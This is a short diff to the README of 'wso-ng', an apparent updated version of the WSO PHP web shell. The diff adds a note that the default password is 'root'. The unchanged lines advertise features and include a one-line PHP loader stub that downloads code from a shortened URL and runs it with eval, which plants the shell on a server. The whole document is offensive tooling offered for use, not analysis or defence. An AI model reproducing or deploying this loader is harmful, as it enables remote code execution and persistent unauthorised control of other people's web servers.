@@ -1,5 +1,6 @@
 # wso-ng
 New generation of famous WSO web shell. With perks included
+# default password is "root"
 # changes
 - can now hook password when loaded via stub `<?php eval(substr(file_get_contents('https://bit.ly/get-wso-ng?pass=ed78a48738eb97ffb5624741bdf391c3'), 5)); ?>`, and will use it instead of hardcoded one
 - all subfile downloads are now cached in /tmp and zipped
